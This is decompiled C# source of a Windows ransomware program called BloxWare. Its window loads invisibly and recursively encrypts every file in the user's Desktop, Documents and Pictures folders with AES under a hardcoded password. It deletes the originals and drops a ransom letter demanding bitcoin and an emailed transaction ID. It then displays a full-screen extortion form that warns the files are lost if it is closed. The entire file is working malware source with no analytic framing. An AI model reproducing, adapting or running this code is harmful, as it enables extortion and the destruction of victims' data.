using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace BloxWare;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".gnaoknaineghioa";

	private const string ENCRYPT_PASSWORD = "3490tioj4w890y4ahjy948ayh4a90yuja4yu4a90y";

	private const string BITCOIN_ADDRESS = "e86bc607-f999-45d6-a0f6-cbc52233b75e";

	private const string BITCOIN_RANSOM_AMOUNT = "0.125";

	private const string EMAIL_ADDRESS = "whitejoreang@gmail.com";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "All of your files have been encrypted.\n\nTo unlock them, please send 0.125 bitcoin(s) to BTC address: e86bc607-f999-45d6-a0f6-cbc52233b75e\nAfterwards, please email your transaction ID to: whitejoreang@gmail.com\n\nThank you and have a nice day!\n\nEncryption Log:\n----------------------------------------\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int encryptedFileCount = 0;

	private IContainer components = null;

	private Label label1;

	private RichTextBox richTextBox1;

	private TextBox textBox1;

	private TextBox txtBitcoinAddress;

	private TextBox txtEmailAddress;

	private Label lblCount;

	private Label label2;

	private Label lblBitcoinAmount;

	private Label label4;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		initializeForm();
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\___RECOVER__FILES__.gnaoknaineghioa.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)lblCount).set_Text("Your files (count: " + encryptedFileCount + ") have been encrypted!");
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)lblBitcoinAmount).set_Text("Please send 0.125 Bitcoin(s) to the following BTC address:");
		((Control)txtBitcoinAddress).set_Text("e86bc607-f999-45d6-a0f6-cbc52233b75e");
		((Control)txtEmailAddress).set_Text("whitejoreang@gmail.com");
		((Control)lblBitcoinAmount).Focus();
	}

	private static void encryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".gnaoknaineghioa"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, "3490tioj4w890y4ahjy948ayh4a90yuja4yu4a90y");
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				encryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".gnaoknaineghioa", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Checking and sending the personal key. Please wait.");
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("You Killed me... YOU CAN'T RECOVER YOUR FIELS");
		Application.Exit();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("You Killed me... YOU CAN'T RECOVER YOUR FIELS");
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_0252: Unknown result type (might be due to invalid IL or missing references)
		//IL_025c: Expected O, but got Unknown
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Expected O, but got Unknown
		//IL_03af: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b9: Expected O, but got Unknown
		//IL_0461: Unknown result type (might be due to invalid IL or missing references)
		//IL_046b: Expected O, but got Unknown
		//IL_0513: Unknown result type (might be due to invalid IL or missing references)
		//IL_051d: Expected O, but got Unknown
		//IL_05c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ce: Expected O, but got Unknown
		//IL_0669: Unknown result type (might be due to invalid IL or missing references)
		//IL_0673: Expected O, but got Unknown
		//IL_0814: Unknown result type (might be due to invalid IL or missing references)
		//IL_081e: Expected O, but got Unknown
		//IL_0826: Unknown result type (might be due to invalid IL or missing references)
		//IL_0830: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		richTextBox1 = new RichTextBox();
		textBox1 = new TextBox();
		txtBitcoinAddress = new TextBox();
		txtEmailAddress = new TextBox();
		lblCount = new Label();
		label2 = new Label();
		lblBitcoinAmount = new Label();
		label4 = new Label();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Segoe UI Semibold", 36f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(274, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(809, 65));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Oops! Your all files are ENCRYPTED!");
		((Control)richTextBox1).set_Font(new Font("Segoe UI", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox1).set_Location(new Point(12, 77));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(1313, 432));
		((Control)richTextBox1).set_TabIndex(1);
		((Control)richTextBox1).set_Text(componentResourceManager.GetString("richTextBox1.Text"));
		((Control)textBox1).set_Anchor((AnchorStyles)2);
		((Control)textBox1).set_Font(new Font("Segoe UI", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.Black);
		((Control)textBox1).set_Location(new Point(611, 580));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(714, 35));
		((Control)textBox1).set_TabIndex(10);
		((Control)textBox1).set_Text("Write you personal key here");
		textBox1.set_TextAlign((HorizontalAlignment)2);
		((Control)txtBitcoinAddress).set_Anchor((AnchorStyles)2);
		((Control)txtBitcoinAddress).set_Font(new Font("Segoe UI", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtBitcoinAddress).set_ForeColor(Color.Black);
		((Control)txtBitcoinAddress).set_Location(new Point(611, 621));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		((Control)txtBitcoinAddress).set_Size(new Size(714, 35));
		((Control)txtBitcoinAddress).set_TabIndex(12);
		((Control)txtBitcoinAddress).set_Text("e86bc607-f999-45d6-a0f6-cbc52233b75e");
		txtBitcoinAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)txtEmailAddress).set_Anchor((AnchorStyles)2);
		((Control)txtEmailAddress).set_Font(new Font("Segoe UI", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtEmailAddress).set_ForeColor(Color.Black);
		((Control)txtEmailAddress).set_Location(new Point(611, 662));
		((Control)txtEmailAddress).set_Name("txtEmailAddress");
		((TextBoxBase)txtEmailAddress).set_ReadOnly(true);
		((Control)txtEmailAddress).set_Size(new Size(714, 35));
		((Control)txtEmailAddress).set_TabIndex(13);
		((Control)txtEmailAddress).set_Text("whitejoreang@gmail.com");
		txtEmailAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)lblCount).set_Anchor((AnchorStyles)14);
		((Control)lblCount).set_Font(new Font("Segoe UI Semibold", 20f, (FontStyle)1));
		((Control)lblCount).set_ForeColor(Color.Black);
		((Control)lblCount).set_Location(new Point(13, 520));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(1066, 51));
		((Control)lblCount).set_TabIndex(14);
		((Control)lblCount).set_Text("Your files (count: n) have been encrypted!");
		lblCount.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_Anchor((AnchorStyles)14);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Font(new Font("Segoe UI", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Black);
		((Control)label2).set_Location(new Point(12, 580));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(529, 35));
		((Control)label2).set_TabIndex(15);
		((Control)label2).set_Text("Type your personal key");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)lblBitcoinAmount).set_Anchor((AnchorStyles)14);
		((Control)lblBitcoinAmount).set_BackColor(Color.Transparent);
		((Control)lblBitcoinAmount).set_Font(new Font("Segoe UI", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lblBitcoinAmount).set_ForeColor(Color.Black);
		((Control)lblBitcoinAmount).set_Location(new Point(6, 621));
		((Control)lblBitcoinAmount).set_Name("lblBitcoinAmount");
		((Control)lblBitcoinAmount).set_Size(new Size(593, 35));
		((Control)lblBitcoinAmount).set_TabIndex(16);
		((Control)lblBitcoinAmount).set_Text("Please send n Bitcoin(s) to the following BTC address:");
		lblBitcoinAmount.set_TextAlign((ContentAlignment)32);
		((Control)label4).set_Anchor((AnchorStyles)14);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Font(new Font("Segoe UI", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Black);
		((Control)label4).set_Location(new Point(12, 662));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(529, 35));
		((Control)label4).set_TabIndex(17);
		((Control)label4).set_Text("Email Address");
		label4.set_TextAlign((ContentAlignment)32);
		((Control)button1).set_BackColor(Color.DodgerBlue);
		((Control)button1).set_Font(new Font("Segoe UI", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new Point(1084, 521));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(241, 53));
		((Control)button1).set_TabIndex(18);
		((Control)button1).set_Text("Check");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DodgerBlue);
		((Form)this).set_ClientSize(new Size(1337, 709));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)lblBitcoinAmount);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("BloxLock");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
